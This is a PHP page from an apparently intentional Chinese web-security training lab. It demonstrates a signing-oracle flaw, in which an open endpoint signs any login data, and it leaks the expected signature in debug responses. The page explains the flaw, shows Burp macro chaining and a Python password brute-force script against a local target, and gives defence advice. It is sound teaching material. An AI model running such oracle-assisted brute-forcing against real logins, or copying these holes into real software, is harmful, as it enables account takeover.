<?php
/**
 * Pikachu-Enhanced v2.0 - 前端加解密对抗: Level 7 - 服务端动态加签防篡改
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/encrypt_helper.inc.php';

// 处理 POST 验签请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawInput = file_get_contents("php://input");
    $data = json_decode($rawInput, true);

    if (!$data) {
        $data = $_POST;
    }

    if (isset($data['username'], $data['password'], $data['timestamp'], $data['signature'])) {
        $username = $data['username'];
        $password = $data['password'];
        $timestamp = intval($data['timestamp']);
        $clientSig = $data['signature'];

        // 1. 校验请求时间戳有效性 (5 分钟)
        $now = time();
        if (abs($now - $timestamp) > 300) {
            echo json_encode(['success' => false, 'error' => '请求时间戳超出有效范围 (Timestamp timeout / expired)'], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 2. 服务端利用仅保存在后端的密钥重新计算 HMAC-SHA256 签名: username + password + timestamp
        $dataToSign = $username . $password . $timestamp;
        $serverSig = hash_hmac('sha256', $dataToSign, ENCRYPT_SIGN_SECRET_KEY);

        // 3. 常量时间安全比对
        if (!hash_equals($serverSig, $clientSig)) {
            echo json_encode([
                'success' => false,
                'error' => '❌ 签名不匹配！数据被篡改或签名生成错误 (Signature mismatch)',
                'debug' => [
                    'expected' => $serverSig,
                    'received' => $clientSig
                ]
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 4. 签名校验通过，进入业务数据库验证
        $authRes = pika_encrypt_verify_user($username, $password);
        if ($authRes['success']) {
            echo json_encode([
                'success' => true,
                'message' => '🎉 服务端签名校验通过，登录成功！',
                'username' => $authRes['username'],
                'debug' => [
                    'verified_signature' => $serverSig,
                    'timestamp' => $timestamp
                ]
            ], JSON_UNESCAPED_UNICODE);
        } else {
            echo json_encode([
                'success' => false,
                'error' => $authRes['error'],
                'debug' => ['signature_status' => 'VALID']
            ], JSON_UNESCAPED_UNICODE);
        }
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => '缺少必需参数 (username, password, timestamp, signature)'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$SELF_PAGE = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
if ($SELF_PAGE == "signdataserver.php") {
    $ACTIVE = array_fill(0, 360, '');
    $ACTIVE[340] = 'active open';
    $ACTIVE[348] = 'active';
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.crypto-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
}
.inspector-panel {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.6;
    overflow-x: auto;
}
.inspector-title {
    color: #94a3b8;
    font-size: 12px;
    text-transform: uppercase;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.nav-tabs-custom {
    border-bottom: 2px solid #e2e8f0;
    margin-bottom: 20px;
    display: flex;
    gap: 8px;
}
.nav-tabs-custom button {
    background: none;
    border: none;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #64748b;
    border-bottom: 2px solid transparent;
    cursor: pointer;
    transition: all 0.2s;
}
.nav-tabs-custom button.active {
    color: #0d9488;
    border-bottom-color: #0d9488;
}
.tab-pane-custom {
    display: none;
}
.tab-pane-custom.active {
    display: block;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="<?php echo $PIKA_ROOT_DIR;?>vul/encrypt/encrypt.php">前端加解密对抗</a></li>
                <li class="active">Level 7 - 服务端动态加签</li>
            </ul>
        </div>

        <div class="page-content">
            <!-- 场景标题与说明 -->
            <div style="margin-bottom: 24px;">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
                    <span class="badge" style="background:#0d9488; font-size:12px; padding:4px 10px;">Level 7</span>
                    <span class="badge" style="background:#2563eb; font-size:12px; padding:4px 10px;">Server Signing Oracle</span>
                    <span class="badge" style="background:#4f46e5; font-size:12px; padding:4px 10px;">Pre-Flight Signature API</span>
                </div>
                <h2 style="font-weight: 800; font-size: 24px; margin: 0 0 8px 0; color: #0f172a;">
                    服务端动态加签防篡改验证 (Server-Side Dynamic Signing Oracle)
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    针对客户端硬编码密钥容易被提取的弊端，本架构将加签私钥完全存放在后端服务器；前端在提交认证前，必须先调用 <code>get-signature.php</code> 接口请求服务端代为计算出 <code>signature</code>，随后将该签名拼接到主请求提交给 <code>signdataserver.php</code> 进行最终比对。看似无懈可击的“秘钥不落地”设计，却引入了密码学中致命的<strong>加签预言机 (Signing Oracle)</strong> 逻辑缺陷！
                </p>
            </div>

            <div class="row">
                <!-- 左侧: 交互式登录挑战卡片 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <h4 style="margin:0 0 16px 0; font-weight:700; font-size:16px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-cloud-arrow-down" style="color:#0d9488;"></i> 服务端动态加签挑战
                        </h4>

                        <div id="loginAlert" style="display:none; margin-bottom:16px;"></div>

                        <form id="cryptoLoginForm" onsubmit="handleServerSignSubmit(event)">
                            <div class="form-group" style="margin-bottom:14px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">账号 (Username):</label>
                                <input type="text" id="username" class="form-control" value="admin" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>
                            <div class="form-group" style="margin-bottom:18px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">密码 (Password):</label>
                                <input type="password" id="password" class="form-control" value="123456" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>

                            <button type="submit" id="submitBtn" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:11px; background:#0d9488; border-color:#0d9488;">
                                <i class="ph-bold ph-cloud-arrow-up"></i> 请求 get-signature.php 获取签名 -> 提交登录
                            </button>
                        </form>
                    </div>

                    <!-- 实时数据流监视器 -->
                    <div class="crypto-card" style="padding: 20px;">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:15px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-broadcast" style="color:#0ea5e9;"></i> 双阶加签流水线实时监视器
                        </h4>
                        
                        <div class="inspector-title"><i class="ph-bold ph-paper-plane-tilt"></i> 阶梯 1: 预调 get-signature.php 响应数据</div>
                        <div class="inspector-panel" id="inspSignApi" style="margin-bottom:12px;">// 提交时自动向 get-signature.php 请求签名...</div>

                        <div class="inspector-title"><i class="ph-bold ph-globe"></i> 阶梯 2: 最终发往 signdataserver.php 的载荷</div>
                        <div class="inspector-panel" id="inspCipher" style="margin-bottom:12px;">// 等待发送...</div>

                        <div class="inspector-title"><i class="ph-bold ph-cpu"></i> 阶梯 3: 服务端验签与数据库认证响应</div>
                        <div class="inspector-panel" id="inspResponse">// 等待服务端响应...</div>
                    </div>
                </div>

                <!-- 右侧: 渗透与对抗指引 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div class="nav-tabs-custom">
                            <button class="active" onclick="switchTab(event, 'tab1')"><i class="ph-bold ph-magnifying-glass"></i> 加签预言机分析</button>
                            <button onclick="switchTab(event, 'tab2')"><i class="ph-bold ph-wrench"></i> Burp 宏请求编排</button>
                            <button onclick="switchTab(event, 'tab3')"><i class="ph-bold ph-terminal"></i> Python 双阶调用流</button>
                            <button onclick="switchTab(event, 'tab4')"><i class="ph-bold ph-shield-check"></i> 安全防御建议</button>
                        </div>

                        <!-- Tab 1: 加签预言机分析 -->
                        <div id="tab1" class="tab-pane-custom active">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🔍 什么是“加签预言机 (Signing Oracle)”？</h5>
                            <ol style="font-size:13.5px; color:#475569; line-height:1.8; padding-left:20px;">
                                <li><strong>架构假象：</strong>开发者认为“加签秘钥放在服务器上不暴露给 JS，攻击者就无法伪造签名”。</li>
                                <li><strong>致命缺陷：</strong>由于 <code>get-signature.php</code> 本身是一个<strong>无鉴权、公开开放的接口</strong>，攻击者无需知道 SecretKey，只需传入任意篡改后的 <code>{username, password, timestamp}</code>，该接口都会忠实地代为计算并返回合法的签名！</li>
                                <li><strong>攻击效果：</strong>攻击者拥有了一个无限次使用的“远程签名计算器”，与持有私钥没有任何实质区别！防篡改机制形同虚设。</li>
                            </ol>
                        </div>

                        <!-- Tab 2: Burp 宏请求编排 -->
                        <div id="tab2" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛠️ Burp Suite Session Handling (宏编排)</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.6;">
                                在 Intruder 暴力破解或 Repeater 测试时，无需人工每次手动获取签名：
                            </p>
                            <ul style="font-size:13px; color:#334155; line-height:1.7;">
                                <li>在 <strong>Project Options -> Sessions -> Session Handling Rules</strong> 中新建规则。</li>
                                <li>添加 <strong>Run a Macro</strong> 动作，录制一个对 <code>/vul/encrypt/get-signature.php</code> 的 POST 请求。</li>
                                <li>配置参数传递：将当前待测试的 <code>password</code> 变量先发给宏请求，从其响应的 JSON 中提取 <code>signature</code> 字段，自动回填覆盖主请求中的 <code>signature</code>！</li>
                            </ul>
                        </div>

                        <!-- Tab 3: Python 脚本 -->
                        <div id="tab3" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🐍 Python 利用加签接口自动化渗透</h5>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:14px; font-size:12px; line-height:1.5; max-height:360px; overflow-y:auto;"><code>import time
import requests

BASE_URL = "http://127.0.0.1:8765/vul/encrypt"
SIGN_URL = f"{BASE_URL}/get-signature.php"
LOGIN_URL = f"{BASE_URL}/signdataserver.php"

def get_server_signature(username, password, timestamp):
    # 步骤 1: 调用加签接口代算签名
    resp = requests.post(SIGN_URL, json={
        "username": username,
        "password": password,
        "timestamp": timestamp
    })
    return resp.json().get("signature")

# 爆破测试
passwords = ["admin", "root", "123456", "password"]
for pwd in passwords:
    now_ts = int(time.time())
    sig = get_server_signature("admin", pwd, now_ts)
    if not sig:
        continue

    # 步骤 2: 携带新鲜签名提交认证
    res = requests.post(LOGIN_URL, json={
        "username": "admin",
        "password": pwd,
        "timestamp": now_ts,
        "signature": sig
    })
    data = res.json()
    if data.get("success"):
        print(f"[+] 利用预言机成功破解: admin / {pwd}")
        break
    else:
        print(f"[-] 密码 [{pwd}] 失败: {data.get('error')}")
</code></pre>
                        </div>

                        <!-- Tab 4: 安全防御机制 -->
                        <div id="tab4" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛡️ 预言机漏洞防御机制</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.7;">
                                1. <strong>严禁设计“公开加签接口”：</strong>若客户端本就不可信，在服务端为其提供开放签名 API 逻辑上自相矛盾。<br>
                                2. <strong>设备完整性与 Token 绑定：</strong>签名应结合用户登录后的会话状态 (Session/JWT) 或通过设备指纹、人机验证通过凭据 (Captcha Token) 共同签署，不可允许匿名用户随意调取加签服务。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function switchTab(evt, tabId) {
    document.querySelectorAll('.nav-tabs-custom button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-pane-custom').forEach(p => p.classList.remove('active'));
    evt.currentTarget.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

async function handleServerSignSubmit(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 向服务端获取动态签名中...';

    const timestamp = Math.floor(Date.now() / 1000);

    // 1. 请求加签接口
    let signature = '';
    try {
        const signResp = await fetch('get-signature.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json; charset=utf-8' },
            body: JSON.stringify({
                username: username,
                password: password,
                timestamp: timestamp
            })
        });
        const signData = await signResp.json();
        document.getElementById('inspSignApi').textContent = JSON.stringify(signData, null, 2);
        if (signData.signature) {
            signature = signData.signature;
        } else {
            throw new Error(signData.error || '未返回有效签名');
        }
    } catch (err) {
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 无法从 get-signature.php 获取签名: ' + err.message;
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-cloud-arrow-up"></i> 请求 get-signature.php 获取签名 -> 提交登录';
        return;
    }

    // 2. 携带签名提交登录请求
    const wirePayload = {
        username: username,
        password: password,
        timestamp: timestamp,
        signature: signature
    };
    document.getElementById('inspCipher').textContent = JSON.stringify(wirePayload, null, 2);

    fetch('signdataserver.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify(wirePayload)
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('inspResponse').textContent = JSON.stringify(data, null, 2);
        alertBox.style.display = 'block';
        if (data.success) {
            alertBox.className = 'alert alert-success';
            alertBox.innerHTML = '<i class="ph-bold ph-check-circle"></i> <strong>' + data.message + '</strong> [' + data.username + '] 验证通过！';
        } else {
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-x-circle"></i> <strong>校验失败:</strong> ' + (data.error || '签名错误');
        }
    })
    .catch(err => {
        document.getElementById('inspResponse').textContent = 'Request Error: ' + err.message;
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 请求发生异常: ' + err.message;
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-cloud-arrow-up"></i> 请求 get-signature.php 获取签名 -> 提交登录';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
